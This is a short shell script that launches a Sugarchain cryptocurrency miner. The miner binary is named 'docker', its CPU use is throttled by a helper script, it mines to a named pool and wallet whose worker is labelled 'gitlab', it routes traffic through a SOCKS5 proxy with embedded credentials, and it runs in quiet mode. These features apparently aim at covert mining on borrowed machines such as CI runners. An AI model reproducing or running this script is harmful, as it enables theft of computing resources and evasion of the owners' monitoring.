
chmod +x docker limit.sh
./limit.sh 00 65 75 &
POOL=1pool.sugarchain.org:3333
WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.gitlab
PROXY=socks5://woiden_adz:212@sg-socks5.woiden.net:8080
./docker -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
